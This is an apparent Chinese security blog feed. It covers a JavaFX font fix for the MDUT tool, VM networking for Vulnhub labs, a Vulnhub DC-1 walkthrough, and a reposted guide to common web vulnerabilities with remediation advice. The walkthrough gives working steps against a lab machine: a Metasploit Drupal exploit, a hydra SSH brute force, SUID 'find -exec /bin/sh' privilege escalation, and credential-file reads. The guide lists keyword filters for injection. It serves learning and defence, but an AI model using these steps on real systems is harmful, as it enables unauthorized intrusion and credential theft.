Utils.getCurrentVersion());</span><br><span class="line">        Scene scene = <span class="keyword">new</span> Scene(root);</span><br><span class="line">        scene.getStylesheets().add(getClass().getResource(<span class="string">&quot;setfont.css&quot;</span>).toExternalForm());</span><br><span class="line">        primaryStage.setScene(scene);</span><br><span class="line"></span><br><span class="line">        primaryStage.show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        launch(args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="image-20230914151341321.png" alt="image-20230914151341321"></p>
<p>原代码来自：MDUT：<a class="link" href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT<i class="fas fa-external-link-alt"></i></a></p>
<p>setfont.css</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.root</span> &#123;</span><br><span class="line">    -fx-<span class="attribute">font-family</span>: <span class="string">&#x27;Sarasa Mono SC&#x27;</span>;</span><br><span class="line">    -fx-<span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">    -fx-text-fill: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原来的代码是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">primaryStage.setScene(new Scene(root));</span><br></pre></td></tr></table></figure>

<p>在scene被primaryStage.setScene之前，给他加上一个getStylesheets().add()</p>
<pre><code>Scene scene = new Scene(root);
scene.getStylesheets().add(getClass().getResource(&quot;setfont.css&quot;).toExternalForm());
primaryStage.setScene(scene);
</code></pre>
<p>其他的用到了scene的地方也要一样的操作，不过不同的fxml文件创建的scene，要用不同的css文件（内容可以一样）</p>
<p>如下图：</p>
<p><img src="image-20230914155835918.png" alt="image-20230914155835918"></p>
<p>对比,修改后：</p>
<p><img src="image-20230914151750271.png" alt="image-20230914151750271"></p>
<p>修改前：</p>
<p><img src="image-20230914151651497.png" alt="image-20230914151651497"></p>
]]></content>
  </entry>
  <entry>
    <title>VirtualBox上的靶机与VMware kali网络问题</title>
    <url>/2019/12/23/VirtualBox%E4%B8%8A%E7%9A%84%E9%9D%B6%E6%9C%BA%E4%B8%8EVMware%20kali%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12084588.html">源地址：https://www.cnblogs.com/This-is-Y/p/12084588.html<i class="fas fa-external-link-alt"></i></a></p>
<p>在Vulnhub上有许多靶机。其中有很多是在VirtualBox上运行的，而kali大多是使用Vmware</p>
<p>打开kali，找到虚拟机网络设置</p>
<img src="1503868-20191223163027008-226967397.png" alt>

<p> </p>
<img src="1503868-20191223163121461-1181037805.png" alt>

<p> </p>
<p> <img src="1503868-20191223163150522-798557590.png" alt></p>
<p> </p>
<p> 桥接模式</p>
<p>这里几个选项，（自己记录一下）</p>
<p>VirtualBox的DC-2虚拟机采用如下网络配置</p>
<img src="1503868-20191223164132359-2094858340.png" alt>

<p> </p>
<p>Vmware下的aiweb-2采用和kali一样的桥接模式</p>
<p>自动 -&gt; 可以扫到virtualBox的虚拟机，但是vmware的虚拟机扫不到</p>
<p>Realtek PCIe GBE Family Controller，Sangfor SSL VPN CS Support System VNIXC，Microsoft Wi-Fi Direct Virtual Adapter和Microsoft Wi-Fi Direct Virtual Adapter #3  -&gt; 在使用arp-scan -l 时，提示my_lookupdev: no suitable device found</p>
<p> VirtualBox Host-Only Ethernet Adapter -&gt; 不会有上面的情况，但是使用arp-scan -l 扫不到任何东西</p>
<p>Qualcomm Atheros QCA61x4A Wireless Network Adapter -&gt; 可以扫到所有东西</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>Vulnhub DC-1靶机渗透学习</title>
    <url>/2019/10/10/Vulnhub%20DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11637694.html">源地址：https://www.cnblogs.com/This-is-Y/p/11637694.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>前言</strong></p>
<p>之前听说过这个叫Vulnhub DC-1的靶机，所以想拿来玩玩学习，结果整个过程都是看着别人的writeup走下来的，学艺不精，不过这个过程也认识到，学会了很多东西。</p>
<p>所以才想写点东西，记录一下</p>
<p><strong>1.下载</strong></p>
<p>地址<a class="link" href="https://www.vulnhub.com/entry/dc-1-1,292/">https://www.vulnhub.com/entry/dc-1-1,292/<i class="fas fa-external-link-alt"></i></a></p>
<img src="1503868-20191008182912843-755043193.png" alt>

<p> </p>
<p> 建议用镜像，快一点</p>
<p>使用Oracle VM VirtualBox打开</p>
<img src="1503868-20191008183234206-2052555030.png" alt>

<p> </p>
<p><strong>2.开始</strong></p>
<p>打开虚拟机后。提示需要账号密码</p>
<img src="1503868-20191008183826342-1988344385.png" alt>

<p> </p>
<p> </p>
<p> 这个是需要你自己去找的</p>
<p>于是打开kali，vmware的网络配置使用桥接网络，用</p>
<p>arp-scan -l</p>
<p>扫描</p>
<img src="1503868-20191008184304149-1087683089.png" alt>

<p>其中的 Cadmus Computer Systems即为我们的目标，打开前面的192.168.124.76，如图</p>
<img src="1503868-20191008184554890-500432642.png" alt>

<p> </p>
<p> 这里推荐一个chrome插件，叫wappalyzer，这个可以检测网站的信息，cms，框架，服务器等等，非常棒。通过这个插件，可以得知这个网站使用的是drupalCMS</p>
<p>在msf中查找对应的信息</p>
<p>search drupal</p>
<img src="1503868-20191008190211244-935277838.png" alt>

<p> </p>
<p> 用第5个，先</p>
<p>set rhosts 192.168.124.76</p>
<p>然后use exploit/unix/webapp/drupal_drupalgeddon2 </p>
<p>再exploit</p>
<p>如图<img src="1503868-20191008191225507-208094555.png" alt> </p>
<p>当提示session1 open时，则已经成功进入了</p>
<p>执行命令shell命令获得shell</p>
<p>输入ls</p>
<img src="1503868-20191008191416951-158428866.png" alt>

<p> </p>
<p>发现有给flag1.txt的文件，打开看一下 </p>
<p>cat flag1.txt</p>
<img src="1503868-20191008192002902-1429591048.png" alt>

<p> </p>
<p> 翻译翻译，每一个好的CMS都需要一个配置文件，你也一样。</p>
<p>找到这个CMS的配置文件（google）</p>
<p>cd sites/default</p>
<p>cat settings.php</p>
<img src="1503868-20191008192805685-1373517764.png" alt>

<p> </p>
<p> 这边看到了flag2</p>
<p>再翻译翻译</p>
<p>　　蛮力和字典攻击不是</p>
<p>　　只有获得访问的方法(您将需要访问)。</p>
<p>　　你能用这些凭证做什么?</p>
<p>意思是让我不要用暴力破解得方法搞密码？maybe</p>
<p>同时，下面有数据库账号密码</p>
<p>dbuser R0ck3t</p>
<p>直到现在还没有拿到登陆的账号密码</p>
<p>这边进入/etc/passwd看一下</p>
<img src="1503868-20191008193732496-156656781.png" alt>

<p> </p>
<p> 发现有个叫flag4的账号，如何用john +hydra试着暴力破解一下</p>
<p>hydra是kali自带的，john需要自己安装，这个网上去找教程，这里不放出来了</p>
<p>hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.124.76</p>
<img src="1503868-20191008194614411-358316779.png" alt>

<p> </p>
<p> 然后密码就出来了。。。。。</p>
<p>在vm virutalBox上登陆一下</p>
<img src="1503868-20191008194906324-1422923090.png" alt>

<p> </p>
<p> </p>
<p>也可以用kalissh远程登陆（推荐用这个，vmbox太tm蛋疼了）</p>
<p>ssh <a class="link" href="mailto:&#x66;&#108;&#97;&#x67;&#x34;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x31;&#x32;&#x34;&#46;&#x37;&#x36;">&#x66;&#108;&#97;&#x67;&#x34;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x31;&#x32;&#x34;&#46;&#x37;&#x36;<i class="fas fa-external-link-alt"></i></a></p>
<img src="1503868-20191008194735795-928890603.png" alt>

<p> </p>
<p> 然后登陆mysql</p>
<p>mysql -u dbuser -p </p>
<img src="1503868-20191008195714318-1593804041.png" alt>

<p> </p>
<p> 然后开始找东西</p>
<p>show databases；</p>
<p>show tables</p>
<p>发现有一个叫users的表</p>
<img src="1503868-20191008200349120-1961374716.png" alt>

<p> </p>
<p> 打开，发现</p>
<img src="1503868-20191008200418127-1504200673.png" alt>

<p> </p>
<p> 再百度一波，如何重置drupal的密码</p>
<p>用update users set pass=‘$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4’ where name=‘admin’;</p>
<p>然后用password登陆，这边这个加密方法我还没搞懂</p>
<p> </p>
<p>之后就可以登录之前的网站(192.168.124.76)了</p>
<img src="1503868-20191010092937917-1985895515.png" alt>

<p> </p>
<p> 登陆后，在网站里扒拉来，扒拉去，在左上的content里看到一个叫flag3的玩意</p>
<p> <img src="1503868-20191010093624422-1257690405.png" alt></p>
<p> </p>
<p> 发现这是一个提示</p>
<img src="1503868-20191010093650497-209099064.png" alt>

<p> </p>
<p> Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
<p>提到了find和-exec，提权用的（学艺不精，看的别人的）</p>
<p> </p>
<p>回到kali</p>
<p> </p>
<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
<p>find / -type f -name getflag -exec “/bin/sh” ;</p>
<p>提权部分知识参考<a class="link" href="https://blog.csdn.net/qq_36119192/article/details/84872644">https://blog.csdn.net/qq_36119192/article/details/84872644<i class="fas fa-external-link-alt"></i></a></p>
<p>ls</p>
<p>cd ../..</p>
<p>cd /root</p>
<p>cat thefinalflag.txt</p>
<img src="1503868-20191010125936186-717095048.png" alt>

<p> </p>
<p> 然后就算是告一段落了</p>
<p> </p>
<p><strong>总结</strong></p>
<p>做完这个感觉自己真的很菜，在此总结一下这个过程中了解到的，学到的，以及还不懂的知识</p>
<p>1.arp-scan -l 　　用来扫描局域网内的主机。（参考<a class="link" href="https://blog.csdn.net/weixin_43221560/article/details/90550294">https://blog.csdn.net/weixin_43221560/article/details/90550294<i class="fas fa-external-link-alt"></i></a>）</p>
<p>2.用 msf5来reach drupal寻找漏洞，配置并使用这些漏洞（一知半解，还得好好学习），</p>
<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#102;&#108;&#97;&#103;&#x34;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#x31;&#x32;&#52;&#46;&#55;&#x36;">&#102;&#108;&#97;&#103;&#x34;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#x31;&#x32;&#52;&#46;&#55;&#x36;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
<p>4.john the Ripper +hydra 爆破，（john下载安装参考<a class="link" href="https://blog.csdn.net/Romanticduan/article/details/81233479">https://blog.csdn.net/Romanticduan/article/details/81233479<i class="fas fa-external-link-alt"></i></a>，使用参考<a class="link" href="https://blog.csdn.net/qq_36119192/article/details/83373895">https://blog.csdn.net/qq_36119192/article/details/83373895<i class="fas fa-external-link-alt"></i></a>）</p>
<p>hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.124.76（也是一知半解，同样得学）</p>
<p>5.suid提权</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
<p>find / -type f -name getflag -exec “/bin/sh” ;</p>
<p>提权部分知识参考<a class="link" href="https://blog.csdn.net/qq_36119192/article/details/84872644">https://blog.csdn.net/qq_36119192/article/details/84872644<i class="fas fa-external-link-alt"></i></a></p>
<p>（这边应该更重要）</p>
<p>6.熟悉了linux的一些命令，文件</p>
<p>目前来说就想到了这些</p>
<p>先这样吧</p>
<p>　　</p>
<h1 id><a href="#" class="headerlink" title></a></h1><p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>Web常见漏洞描述及修复建议</title>
    <url>/2021/07/21/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-This-is-Y/</url>
    <content><![CDATA[<p>转载自：<a class="link" href="https://www.cnblogs.com/iAmSoScArEd/p/10651947.html">https://www.cnblogs.com/iAmSoScArEd/p/10651947.html<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p>
<p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
<p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p>
<p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p>
<p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p>
<p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>
<p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p>
<p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
<p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
　　
　　</p>
<h1 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p>
<p>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p>
<p>XSS攻击可导致以下危害：</p>
<p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p>
<p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p>
<p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p>
<p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p>
<p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>
<p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p>
<p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p>
<h2 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h2><p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p>
<p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p>
<p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p>
<p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>
<p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。
　　</p>
<h1 id="3-XXE"><a href="#3-XXE" class="headerlink" title="3.XXE"></a>3.XXE</h1><h2 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>XXE漏洞全称XML External Entity Injection即XML外部实体注入漏洞,XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、×××内网网站、发起dos×××等危害。XEE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
<h2 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h2><p>（1） 检查所使用的底层XML解析库，默认禁止外部实体的解析；<br>（2） 是若使用第三方应用代码,需要及时升级补丁；<br>（3）是对用户提交的XML数据进行过滤，如关键词：&lt;!DOCTYPE和&lt;!ENTITY或者SYSTEM和PUBLIC等。</p>
<h1 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4.CSRF"></a>4.CSRF</h1><h2 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p>
<h2 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、验证请求的Referer是否来自本网站，但可被绕过。</p>
<p>　　2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。
　　</p>
<h1 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5.SSRF"></a>5.SSRF</h1><h2 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p>
<p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>
<p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p>
<p>　　(5)、利用File协议读取本地文件。</p>
<h2 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</p>
<p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p>
<p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>　　4、验证请求的文件格式</p>
<p>　　5、禁止跳转</p>
<p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p>
<p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
　　</p>
<h1 id="6-任意命令-代码执行"><a href="#6-任意命令-代码执行" class="headerlink" title="6.任意命令/代码执行"></a>6.任意命令/代码执行</h1><h2 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p>
<h2 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p>
<p>　　2、减少或不使用代码或命令执行函数</p>
<p>　　3、客户端提交的变量在放入函数前进行检测</p>
<p>　　4、减少或不使用危险函数
　　</p>
<h1 id="7-任意文件上传"><a href="#7-任意文件上传" class="headerlink" title="7.任意文件上传"></a>7.任意文件上传</h1><h2 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p>
<h2 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p>
<p>　　2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p>
<p>　　3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p>
<p>　　4、严格限制上传的文件路径。</p>
<p>　　5、文件扩展名服务端白名单校验。</p>
<p>　　6、文件内容服务端校验。</p>
<p>　　7、上传文件重命名。</p>
<p>　　8、隐藏上传文件路径。
　　</p>
<h1 id="8-目录穿越-目录遍历"><a href="#8-目录穿越-目录遍历" class="headerlink" title="8.目录穿越/目录遍历"></a>8.目录穿越/目录遍历</h1><h2 id="漏洞描述-7"><a href="#漏洞描述-7" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。</p>
<h2 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符../。
　　</p>
<h1 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9.文件包含"></a>9.文件包含</h1><h2 id="漏洞描述-8"><a href="#漏洞描述-8" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p>
<h2 id="修复建议-8"><a href="#修复建议-8" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、严格检查变量是否已经初始化。</p>
<p>　　2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。</p>
<p>　　3、严格检查文件包含函数中的参数是否外界可控。
　　</p>
<h1 id="10-弱口令"><a href="#10-弱口令" class="headerlink" title="10.弱口令"></a>10.弱口令</h1><h2 id="漏洞描述-9"><a href="#漏洞描述-9" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p>
<p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p>
<h2 id="修复建议-9"><a href="#修复建议-9" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p>
<p>　　2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p>
<p>　　3、增加人机验证机制，限制ip访问次数。
　　</p>
<h1 id="11-暴力破解"><a href="#11-暴力破解" class="headerlink" title="11.暴力破解"></a>11.暴力破解</h1><h2 id="漏洞描述-10"><a href="#漏洞描述-10" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p>
<h2 id="修复建议-10"><a href="#修复建议-10" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p>
<p>　　2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p>
<p>　　3、增加人机验证机制</p>
<p>　　4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。
　　</p>
<h1 id="12-越权访问"><a href="#12-越权访问" class="headerlink" title="12.越权访问"></a>12.越权访问</h1><h2 id="漏洞描述-11"><a href="#漏洞描述-11" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p>
<h2 id="修复建议-11"><a href="#修复建议-11" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、对用户访问角色的权限进行严格的检查及限制。</p>
<p>　　2、在一些操作时可以使用session对用户的身份进行判断和控制
　　</p>
<h1 id="13-未授权访问"><a href="#13-未授权访问" class="headerlink" title="13.未授权访问"></a>13.未授权访问</h1><h2 id="漏洞描述-12"><a href="#漏洞描述-12" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p>
<h2 id="修复建议-12"><a href="#修复建议-12" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p>
<p>　　2、可以使用session对用户的身份进行判断和控制。
　　</p>
<h1 id="14-列目录"><a href="#14-列目录" class="headerlink" title="14.列目录"></a>14.列目录</h1><h2 id="漏洞描述-13"><a href="#漏洞描述-13" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p>
<h2 id="修复建议-13"><a href="#修复建议-13" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p>
<p>　　2、设置目录访问权限
　　</p>
<h1 id="15-PHP反序列化"><a href="#15-PHP反序列化" class="headerlink" title="15.PHP反序列化"></a>15.PHP反序列化</h1><h2 id="漏洞描述-14"><a href="#漏洞描述-14" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p>
<p>可参考：<a class="link" href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="修复建议-14"><a href="#修复建议-14" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、对传入的对象进行严格的过滤检查</p>
<p>　　2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。
　　</p>
<h1 id="16-http-slow拒绝服务攻击"><a href="#16-http-slow拒绝服务攻击" class="headerlink" title="16.http slow拒绝服务攻击"></a>16.http slow拒绝服务攻击</h1><h2 id="漏洞描述-15"><a href="#漏洞描述-15" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p>
<h2 id="修复建议-15"><a href="#修复建议-15" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　对于 Apache 可以做以下优化（其他服务器原理相同）：</p>
<p>　　1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</p>
<p>　　2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p>
